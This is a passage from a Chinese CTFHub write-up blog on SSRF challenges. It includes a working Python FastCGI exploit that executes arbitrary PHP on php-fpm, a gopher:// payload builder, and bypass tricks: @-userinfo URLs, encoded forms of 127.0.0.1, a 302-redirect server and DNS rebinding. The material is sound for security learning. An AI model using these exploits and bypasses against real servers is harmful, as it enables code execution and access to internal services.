        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>__connect<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'connect failure! please check your fasctcgi-server !!'</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>
        requestId <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        request <span class="token operator">=</span> <span class="token string">b""</span>
        beginFCGIRecordContent <span class="token operator">=</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> \
                                 <span class="token operator">+</span> bchr<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_ROLE_RESPONDER<span class="token punctuation">)</span> \
                                 <span class="token operator">+</span> bchr<span class="token punctuation">(</span>self<span class="token punctuation">.</span>keepalive<span class="token punctuation">)</span> \
                                 <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span>
        request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_BEGIN<span class="token punctuation">,</span>
                                              beginFCGIRecordContent<span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>
        paramsRecord <span class="token operator">=</span> <span class="token string">b''</span>
        <span class="token keyword">if</span> nameValuePairs<span class="token punctuation">:</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token keyword">in</span> nameValuePairs<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                name <span class="token operator">=</span> force_bytes<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
                value <span class="token operator">=</span> force_bytes<span class="token punctuation">(</span>value<span class="token punctuation">)</span>
                paramsRecord <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeNameValueParams<span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span>
        <span class="token keyword">if</span> paramsRecord<span class="token punctuation">:</span>
            request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_PARAMS<span class="token punctuation">,</span> paramsRecord<span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>
        request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_PARAMS<span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>
        <span class="token keyword">if</span> post<span class="token punctuation">:</span>
            request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDIN<span class="token punctuation">,</span> force_bytes<span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>
        request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDIN<span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>request<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span> <span class="token operator">=</span> FastCGIClient<span class="token punctuation">.</span>FCGI_STATE_SEND
        self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">b''</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>__waitForResponse<span class="token punctuation">(</span>requestId<span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">__waitForResponse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> requestId<span class="token punctuation">)</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token string">b''</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            buf <span class="token operator">=</span> self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">len</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
            data <span class="token operator">+=</span> buf
        data <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            response <span class="token operator">=</span> self<span class="token punctuation">.</span>__decodeFastCGIRecord<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> response<span class="token punctuation">:</span>
                <span class="token keyword">break</span>
            <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDOUT \
                    <span class="token keyword">or</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDERR<span class="token punctuation">:</span>
                <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDERR<span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span> <span class="token operator">=</span> FastCGIClient<span class="token punctuation">.</span>FCGI_STATE_ERROR
                <span class="token keyword">if</span> requestId <span class="token operator">==</span> <span class="token builtin">int</span><span class="token punctuation">(</span>response<span class="token punctuation">[</span><span class="token string">'requestId'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> response<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span>
            <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>FCGI_STATE_SUCCESS<span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span>
    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"fastcgi connect host:{} port:{}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>host<span class="token punctuation">,</span> self<span class="token punctuation">.</span>port<span class="token punctuation">)</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'Php-fpm code execution vulnerability client.'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'host'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Target host, such as 127.0.0.1'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'--code'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'What php code your want to execute'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'&lt;?php phpinfo(); exit; ?&gt;'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span> <span class="token string">'--port'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'FastCGI port'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">9000</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">)</span>
    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
    client <span class="token operator">=</span> FastCGIClient<span class="token punctuation">(</span>args<span class="token punctuation">.</span>host<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    params <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    documentRoot <span class="token operator">=</span> <span class="token string">"/"</span>
    uri <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token builtin">file</span>
    content <span class="token operator">=</span> args<span class="token punctuation">.</span>code
    params <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'GATEWAY_INTERFACE'</span><span class="token punctuation">:</span> <span class="token string">'FastCGI/1.0'</span><span class="token punctuation">,</span>
        <span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
        <span class="token string">'SCRIPT_FILENAME'</span><span class="token punctuation">:</span> documentRoot <span class="token operator">+</span> uri<span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">'SCRIPT_NAME'</span><span class="token punctuation">:</span> uri<span class="token punctuation">,</span>
        <span class="token string">'QUERY_STRING'</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
        <span class="token string">'REQUEST_URI'</span><span class="token punctuation">:</span> uri<span class="token punctuation">,</span>
        <span class="token string">'DOCUMENT_ROOT'</span><span class="token punctuation">:</span> documentRoot<span class="token punctuation">,</span>
        <span class="token string">'SERVER_SOFTWARE'</span><span class="token punctuation">:</span> <span class="token string">'php/fcgiclient'</span><span class="token punctuation">,</span>
        <span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>
        <span class="token string">'REMOTE_PORT'</span><span class="token punctuation">:</span> <span class="token string">'9985'</span><span class="token punctuation">,</span>
        <span class="token string">'SERVER_ADDR'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>
        <span class="token string">'SERVER_PORT'</span><span class="token punctuation">:</span> <span class="token string">'80'</span><span class="token punctuation">,</span>
        <span class="token string">'SERVER_NAME'</span><span class="token punctuation">:</span> <span class="token string">"localhost"</span><span class="token punctuation">,</span>
        <span class="token string">'SERVER_PROTOCOL'</span><span class="token punctuation">:</span> <span class="token string">'HTTP/1.1'</span><span class="token punctuation">,</span>
        <span class="token string">'CONTENT_TYPE'</span><span class="token punctuation">:</span> <span class="token string">'application/text'</span><span class="token punctuation">,</span>
        <span class="token string">'CONTENT_LENGTH'</span><span class="token punctuation">:</span> <span class="token string">"%d"</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">'PHP_VALUE'</span><span class="token punctuation">:</span> <span class="token string">'auto_prepend_file = php://input'</span><span class="token punctuation">,</span>
        <span class="token string">'PHP_ADMIN_VALUE'</span><span class="token punctuation">:</span> <span class="token string">'allow_url_include = On'</span>
    <span class="token punctuation">}</span>
    response <span class="token operator">=</span> client<span class="token punctuation">.</span>request<span class="token punctuation">(</span>params<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>同时可以在vps或者kali上开启监听，这里我用kali监听，并且将监听到的流量给了1.txt</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222210517783.png" alt="image-20231222210517783"></p>
<p>同时我们在本地上执行上述exp</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222210656011.png" alt="image-20231222210656011"></p>
<p>得到1.txt我们需要对其中的内容进行两次url编码</p>
<pre class="line-numbers language-none"><code class="language-none">python [脚本名] -c [要执行的代码] -p [端口号] [ip] [要执行的php文件]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
<span class="token builtin">file</span><span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"%0A"</span><span class="token punctuation">,</span><span class="token string">"%0A%0D"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"gopher://127.0.0.1:9000/_"</span><span class="token operator">+</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222210609376.png" alt="image-20231222210609376"></p>
<p>将得到的内容直接传入url即可，如下图可以看到虽然乱码，但是我们知道了当前flag文件的位置了</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222210459609.png" alt="image-20231222210459609"></p>
<p>接下来就是进行读取了，步骤同上述即可</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222210941100.png" alt="image-20231222210941100"></p>
<h3 id="URL-Bypass">URL Bypass</h3>
<p>至于那个打Redis的放在其他文章了，这里懒得在写一次了。</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20240107193125161.png" alt="image-20240107193125161"></p>
<p>这里根据提示url后面必须以上面的开头，直接@绕过：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">采用http基本身份认证的方式绕过：
如：<span class="token property">http</span><span class="token punctuation">:</span><span class="token comment">//www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异</span>
在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。
详情可参考PHP官方文档<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>构造：<code>?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</code>即可</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20240107193234698.png" alt="image-20240107193234698"></p>
<h3 id="数字IP-Bypass">数字IP Bypass</h3>
<p>题目提示：这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20240107193524657.png" alt="image-20240107193524657"></p>
<p>这里看到了ban的信息，127、172、@、. 均被过滤，这里看到一个IP进制转换的网址很不错：</p>
<p><a target="_blank" rel="noopener" href="https://tool.520101.com/wangluo/jinzhizhuanhuan/">https://tool.520101.com/wangluo/jinzhizhuanhuan/</a></p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20240107193721630.png" alt="image-20240107193721630"></p>
<p>我们对上述的进制一个个尝试一下，发现十进制的可以利用</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20240107193756362.png" alt="image-20240107193756362"></p>
<p>tips：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">127.0.0.1：八进制：0177.0.0.1十六进制：0x7f.0.0.1十进制：2130706433

IP地址转为八、十、十六进制及IP地址省略写法（以下均代表127.0.0.1）

   0177.00.00.01
   2130706433
   0x7f.0x0.0x0.0x1
   127.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="302跳转-Bypass">302跳转 Bypass</h3>
<p>题目提示：SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧</p>
<p>我们先利用file协议读取源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: /?url=_"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/127|172|10|192/"</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker! Ban Intranet IP"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>不过可以看到这里的过滤并不全，利用进制转换依旧可以绕过，但我们还是要学一下302跳转的。</p>
<p>原理：需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中，服务端代码如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: http://127.0.0.1/flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">#这里输入你想要访问的内网IP</span>
<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20240107194931163.png" alt="image-20240107194931163"></p>
<h3 id="DNS重绑定-Bypass">DNS重绑定 Bypass</h3>
<p>题目提示：关键词：DNS重绑定。剩下的自己来吧，也许附件中的链接能有些帮助</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: /?url=_"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/127|172|10|192/"</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker! Ban Intranet IP"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>源码没变，依照题目的意思：我们知道我们在输入域名的时候，对方的DNS服务器会将其解析为对应IP地址，随后判断IP地址是否安全，如果安全在curl去请求这个IP地址，但从这个解析判断到curl请求的过程中有一个时间差，我们可以利用该时间差进行攻击。</p>
<p>先搞一个域名让其解析的IP地址为一个安全的，随后在对方服务器成功解析并判断IP安全之后，在将域名绑定为127.0.0.1等内网IP，随后成功绕过限制而被curl去请求。这里用到个网站：</p>
<p><a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20240107200717155.png" alt="image-20240107200717155"></p>
<p>简单来说我们在上面写一个正常IP，和一个非正常IP，接着这个网站会自动生成一个TTL值很低的域名，这意味着该DNS记录在DNS服务器上的缓存时间就很小，导致修改记录之后在各地的生效时间加快。</p>
<p>意味着如果我们临时改变域名指向的IP，他会很快知悉到这个域名解析变化，并顺应我们的改变快速将域名解析到其他IP。</p>
<p>具体可参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89426041">https://zhuanlan.zhihu.com/p/89426041</a></p>
<h1>0x03 参考文章</h1>
<p>http协议参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u013870094/article/details/79098628">HTTP/1.1详解</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54037445/article/details/127926840?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170290103516800211517623%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170290103516800211517623&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-127926840-null-null.142%5Ev96%5Epc_search_result_base4&amp;utm_term=ctfhub%20git%E6%B3%84%E9%9C%B2stash&amp;spm=1018.2226.3001.4187">CTFHub-Web-信息泄露-Git泄露</a></p>
<p><a target="_blank" rel="noopener" href="https://www.wolai.com/ctfhub/4Ezj7s8fqNhFxujCdxbuy8">命令注入</a>–管道符命令的解释参考</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/118387034?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=ctfhub%20post%E8%AF%B7%E6%B1%82&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-4-118387034.142%5Ev96%5Epc_search_result_base9&amp;spm=1018.2226.3001.4187">CTFHub技能树 Web-SSRF POST请求</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_48799157/article/details/123934857?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170323401816800180636035%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170323401816800180636035&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123934857-null-null.142%5Ev96%5Epc_search_result_base9&amp;utm_term=CTFhub%20post%E8%AF%B7%E6%B1%82&amp;spm=1018.2226.3001.4187">CTFHub技能树笔记之SSRF：POST请求、文件上传</a></p>
